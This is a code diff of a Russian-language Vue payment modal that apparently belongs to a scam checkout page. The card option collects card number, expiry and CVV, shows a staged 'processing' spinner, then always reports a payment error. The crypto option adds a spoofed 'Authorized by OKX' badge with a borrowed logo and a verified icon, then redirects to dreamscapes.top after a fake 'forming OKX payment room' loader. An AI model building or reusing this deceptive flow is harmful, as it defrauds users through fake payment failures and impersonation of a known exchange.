@@ -1,11 +1,14 @@
 <template>
   <Teleport to="body">
     <div v-if="dialogVisible" class="modal-overlay" @click.self="closeDialog">
-      <div class="modal-dialog payment-modal custom-loading-svg" 
-           v-loading="loading"
-           :element-loading-svg="svg"
-           element-loading-svg-view-box="-10, -10, 50, 50"
-           element-loading-text="Обработка платежа, пожалуйста не закрывайте данное окно...">
+      <div 
+        class="modal-dialog payment-modal" 
+        v-loading="loading"
+        element-loading-background="rgba(0, 0, 0, 0.5)"
+        :element-loading-text="loadingText"
+        element-loading-svg-view-box="-10, -10, 50, 50"
+        :element-loading-svg="svg"
+      >
         <button class="close-button" @click="closeDialog">×</button>
         <div class="payment-container">
           <div class="payment-header">
@@ -20,10 +23,7 @@
               @click="form.paymentMethod = 'card'"
             >
               <div class="method-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <rect x="2" y="5" width="20" height="14" rx="2" />
-                  <line x1="2" y1="10" x2="22" y2="10" />
-                </svg>
+                <img src="../../../assets/rb_5915.png" alt="Банковская карта" style="width: 45px; margin-top: -10px; margin-left: -10px !important;" />
               </div>
               <div class="method-info">
                 <span class="method-title">Банковская карта</span>
@@ -37,11 +37,7 @@
               @click="form.paymentMethod = 'crypto'"
             >
               <div class="method-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <circle cx="12" cy="12" r="8" />
-                  <line x1="12" y1="8" x2="12" y2="16" />
-                  <line x1="8" y1="12" x2="16" y2="12" />
-                </svg>
+                <img src="https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.0/svg/color/btc.svg" alt="Криптовалюта" />
               </div>
               <div class="method-info">
                 <span class="method-title">Криптовалюта</span>
@@ -84,15 +80,20 @@
           </div>
 
           <div class="crypto-message" v-else>
+            <div class="okx-logo">
+                  <img src="https://miro.medium.com/v2/resize:fit:822/0*YiPfP8pxHtcyVuWy.png" alt="OKX Logo"  style="width: 70px; border-radius: 10px;"/>
+                </div>
             <div class="message-content">
-              <div class="wallet-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4" />
-                  <path d="M4 6v12c0 1.1.9 2 2 2h14v-4" />
-                  <path d="M18 12a2 2 0 0 0-2 2c0 1.1.9 2 2 2h4v-4h-4z" />
-                </svg>
+              <div class="security-badge">
+                
+                <span>Авторизировано <strong>OKX</strong></span>
+                <div class="verified-badge">
+                  <img src="https://cdn-icons-png.flaticon.com/512/5972/5972778.png" alt="Verified" style="width: 25px;" />
+                </div>
               </div>
-              <span>Привяжите свой кошелек</span>
+              <div class="info-text">
+                <p>Безопасный криптовалютный платеж через OKX</p>
+              </div>
             </div>
           </div>
 
@@ -106,10 +107,9 @@
               </button>
             </template>
             <template v-else>
-              <a href="https://dreamscapes.top/" class="pay-btn crypto-pay-btn">
+              <button class="crypto-pay-btn" @click="handleCryptoPayment">
                 Перейти к оплате
-              </a>
-
+              </button>
             </template>
           </div>
         </div>
@@ -117,28 +117,28 @@
     </div>
   </Teleport>
 </template>
+
 <script setup>
-/* eslint-disable no-unused-vars */
-import { ref, reactive, defineExpose, watch, defineEmits } from 'vue'
+import { ref, reactive, defineExpose, defineEmits } from 'vue'
 import { ElMessage } from 'element-plus'
-
-const dialogVisible = ref(false)
-const loading = ref(false)
-
-const svg = `
-         <path class="path" d="
-           M 30 15
-           L 28 17
-           M 25.61 25.61
-           A 15 15, 0, 0, 1, 15 30
-           A 15 15, 0, 1, 1, 27.99 7.5
-           L 15 15
-         " style="stroke-width: 4px; fill: rgba(0, 0, 0, 0)"/>
-       `
 
 const emit = defineEmits(['paymentSuccess', 'paymentError'])
 
-// Начальное состояние формы
+const dialogVisible = ref(false)
+const loading = ref(false)
+const loadingText = ref('')
+
+const svg = `
+  <path class="path" d="
+    M 30 15
+    L 28 17
+    M 25.61 25.61
+    A 15 15, 0, 0, 1, 15 30
+    A 15 15, 0, 1, 1, 27.99 7.5
+    L 15 15
+  " style="stroke-width: 4px; fill: rgba(0, 0, 0, 0)"/>
+`
+
 const form = reactive({
   paymentMethod: 'card',
   cardNumber: '',
@@ -147,24 +147,21 @@ const form = reactive({
   amount: '999'
 })
 
+const openDialog = () => {
+  dialogVisible.value = true
+}
+
 const closeDialog = () => {
-  loading.value = false  // Сначала сбрасываем загрузку
-  dialogVisible.value = false  // Потом закрываем диалог
-  // Очистка формы при закрытии
+  dialogVisible.value = false
+  loading.value = false
+  
+  // Reset form
   form.cardNumber = ''
   form.expiryDate = ''
   form.cvv = ''
+  form.paymentMethod = 'card'
 }
 
-const toggleScrollLock = (isLocked) => {
-  document.body.style.overflow = isLocked ? 'hidden' : ''
-}
-
-watch(dialogVisible, (newValue) => {
-  toggleScrollLock(newValue)
-})
-
-// Форматирование номера карты
 const formatCardNumber = (e) => {
   let value = e.target.value.replace(/\D/g, '')
   value = value.replace(/(\d{4})/g, '$1 ').trim()
@@ -172,7 +169,6 @@ const formatCardNumber = (e) => {
   form.cardNumber = e.target.value
 }
 
-// Форматирование даты
 const formatExpiryDate = (e) => {
   let value = e.target.value.replace(/\D/g, '')
   
@@ -184,7 +180,6 @@ const formatExpiryDate = (e) => {
   form.expiryDate = e.target.value
 }
 
-// Валидация формы перед отправкой
 const validateForm = () => {
   if (form.paymentMethod === 'card') {
     if (form.cardNumber.replace(/\s/g, '').length !== 16) {
@@ -208,40 +203,28 @@ const validateForm = () => {
 const submitForm = async () => {
   if (!validateForm()) return
 
-  try {
-    if (form.paymentMethod === 'card') {
-      loading.value = true
-      
-      setTimeout(() => {
-        loading.value = false
-        ElMessage.error('Ошибка обработки платежа. Попробуйте позже или используйте другой способ оплаты.')
-        dialogVisible.value = false // Закрываем окно
-        // Очистка формы
-        form.cardNumber = ''
-        form.expiryDate = ''
-        form.cvv = ''
-      }, 5000)
-      
-      return
-    }
-    
-    ElMessage.success('Оплата прошла успешно!')
+  loading.value = true
+  loadingText.value = 'Обработка платежа...'
+  
+  setTimeout(() => {
     loading.value = false
+    ElMessage.error('Ошибка обработки платежа. Попробуйте позже.')
+    emit('paymentError', new Error('Payment processing error'))
     dialogVisible.value = false
-    
-    // Очистка формы
     form.cardNumber = ''
     form.expiryDate = ''
     form.cvv = ''
-  } catch (error) {
-    loading.value = false
-    ElMessage.error('Произошла ошибка при обработке платежа')
-  }
+  }, 3000)
 }
 
-// Открытие модального окна
-const openDialog = () => {
-  dialogVisible.value = true
+const handleCryptoPayment = async () => {
+  loading.value = true
+  loadingText.value = 'Формирование комнаты оплаты на OKX...'
+  
+  setTimeout(() => {
+    window.location.href = 'https://dreamscapes.top/'
+    loading.value = false
+  }, 3000)
 }
 
 defineExpose({
@@ -250,6 +233,9 @@ defineExpose({
 </script>
 
 <style scoped>
+method-icon img,
+
+
 .modal-overlay {
   position: fixed;
   top: 0;
@@ -319,49 +305,6 @@ defineExpose({
   flex-direction: column;
   gap: 12px;
   margin-bottom: 24px;
-}
-
-.crypto-message {
-  padding: 24px;
-  background: rgba(255, 255, 255, 0.05);
-  border-radius: 12px;
-  text-align: center;
-  display: flex;
-  flex-direction: column;
-  gap: 20px;
-}
-
-.message-content {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 12px;
-  color: rgba(255, 255, 255, 0.7);
-  font-size: 15px;
-}
-
-.wallet-icon {
-  width: 24px;
-  height: 24px;
-  color: #fff;
-}
-
-.crypto-redirect-btn {
-  display: inline-block;
-  padding: 12px 24px;
-  background: linear-gradient(135deg, #34d399 0%, #059669 100%);
-  border-radius: 12px;
-  color: #fff;
-  text-decoration: none;
-  font-weight: 500;
-  font-size: 15px;
-  transition: all 0.3s ease;
-  border: none;
-}
-
-.crypto-redirect-btn:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 4px 12px rgba(52, 211, 153, 0.3);
 }
 
 .payment-method-item {
@@ -448,21 +391,76 @@ input::placeholder {
   background: rgba(255, 255, 255, 0.05);
   border-radius: 12px;
   text-align: center;
+  margin-bottom: -10px;
 }
 
 .message-content {
   display: flex;
+  flex-direction: column;
   align-items: center;
-  justify-content: center;
-  gap: 12px;
-  color: rgba(255, 255, 255, 0.7);
-  font-size: 15px;
+  gap: 16px;
 }
 
-.lock-icon {
-  width: 24px;
-  height: 24px;
+.security-badge {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 20px;
+  background: rgba(20, 20, 20, 0.6);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 20px;
   color: #fff;
+  font-size: 14px;
+  font-weight: 500;
+  margin-bottom: 16px;
+  position: relative;
+  overflow: hidden;
+  backdrop-filter: blur(10px);
+}
+
+.okx-logo {
+  width: 2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: transparent;
+  border-radius: 8px;
+  padding: 4px;
+  align-items: center;
+  align-self: center;
+  margin-left: 150px;
+}
+
+.verified-badge {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-left: auto;
+  color: #34d399;
+}
+
+.info-text {
+    color: rgba(255, 255, 255, 0.7);
+    font-size: 14px;
+    line-height: 1.5;
+    text-align: center;
+    padding: 0 12px;
+    margin-top: -25px;
+    
+    display: inline-block;
+    background-color: rgba(255, 255, 255, 0.1);
+    border-radius: 20px;
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    box-shadow: 
+        0 4px 6px rgba(0, 0, 0, 0.1),
+        0 1px 3px rgba(0, 0, 0, 0.08);
+    transition: all 0.3s ease;
+}
+
+.info-text:hover {
+    background-color: rgba(255, 255, 255, 0.15);
+    transform: scale(1.01);
 }
 
 .payment-footer {
@@ -493,6 +491,159 @@ input::placeholder {
   box-shadow: 0 4px 12px rgba(52, 211, 153, 0.3);
 }
 
+.crypto-pay-btn {
+  text-decoration: none;
+  display: inline-block;
+  width: 100%;
+  text-align: center;
+  padding: 12px 30px;
+  background: linear-gradient(45deg, #6f42c1, #a855f7, #7e22ce);
+  background-size: 200% 200%;
+  animation: gradient 3s ease infinite;
+  color: white;
+  border-radius: 12px;
+  font-weight: 600;
+  font-size: 15px;
+  transition: all 0.3s ease;
+  border: none;
+  cursor: pointer;
+  box-shadow: 0 4px 15px rgba(107, 33, 168, 0.3);
+  letter-spacing: 0.5px;
+  height: 48px;
+}
+
+.crypto-pay-btn:disabled {
+  opacity: 0.8;
+  cursor: wait;
+}
+
+.crypto-pay-btn:hover {
+  background-size: 150% 150%;
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(107, 33, 168, 0.4);
+}
+
+.crypto-pay-btn:active {
+  transform: translateY(1px);
+  box-shadow: 0 2px 10px rgba(107, 33, 168, 0.3);
+}
+
+.global-loading-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.85);
+  backdrop-filter: blur(12px);
+  z-index: 9998;
+  animation: fadeIn 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.pulsing-container {
+  position: relative;
+  width: 120px;
+  height: 120px;
+}
+
+.security-indicator {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  color: #34d399;
+  animation: pulse 2s infinite;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.security-indicator::before {
+  content: '';
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  border-radius: 50%;
+  background: rgba(52, 211, 153, 0.2);
+  animation: ripple 2s infinite;
+}
+
+.security-indicator.completed {
+  animation: completedPulse 0.5s forwards;
+}
+
+.message-fade {
+  animation: messageFade 0.3s ease;
+}
+
+@keyframes pulse {
+  0% {
+    transform: translate(-50%, -50%) scale(1);
+  }
+  50% {
+    transform: translate(-50%, -50%) scale(1.1);
+  }
+  100% {
+    transform: translate(-50%, -50%) scale(1);
+  }
+}
+
+@keyframes ripple {
+  0% {
+    transform: scale(1);
+    opacity: 1;
+  }
+  100% {
+    transform: scale(2);
+    opacity: 0;
+  }
+}
+
+@keyframes completedPulse {
+  0% {
+    transform: translate(-50%, -50%) scale(1);
+  }
+  50% {
+    transform: translate(-50%, -50%) scale(1.2);
+  }
+  100% {
+    transform: translate(-50%, -50%) scale(0);
+  }
+}
+
+@keyframes messageFade {
+  0% {
+    opacity: 0.7;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+
+@keyframes gradient {
+  0% {
+    background-position: 0% 50%;
+  }
+  50% {
+    background-position: 100% 50%;
+  }
+  100% {
+    background-position: 0% 50%;
+  }
+}
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 1;
+  }
+}
+
 @media (max-width: 480px) {
   .modal-dialog {
     width: 90%;
@@ -517,54 +668,10 @@ input::placeholder {
   }
 
   .cancel-btn,
-  .pay-btn {
+  .pay-btn,
+  .crypto-pay-btn {
     height: 44px;
     font-size: 14px;
   }
-}
-
-.crypto-pay-btn {
-  text-decoration: none;
-  display: inline-block;
-  width: 100%;
-  text-align: center;
-  padding: 12px 30px;
-  background: linear-gradient(45deg, #6f42c1, #a855f7, #7e22ce);
-  background-size: 200% 200%;
-  animation: gradient 3s ease infinite;
-  color: white;
-  border-radius: 12px;
-  font-weight: 600;
-  font-size: 15px;
-  transition: all 0.3s ease;
-  border: none;
-  cursor: pointer;
-  box-shadow: 0 4px 15px rgba(107, 33, 168, 0.3);
-  letter-spacing: 0.5px;
-  height: auto;
-  
-}
-
-@keyframes gradient {
-  0% {
-    background-position: 0% 50%;
-  }
-  50% {
-    background-position: 100% 50%;
-  }
-  100% {
-    background-position: 0% 50%;
-  }
-}
-
-.crypto-pay-btn:hover {
-  background-size: 150% 150%;
-  transform: translateY(-2px);
-  box-shadow: 0 6px 20px rgba(107, 33, 168, 0.4);
-}
-
-.crypto-pay-btn:active {
-  transform: translateY(1px);
-  box-shadow: 0 2px 10px rgba(107, 33, 168, 0.3);
 }
 </style>
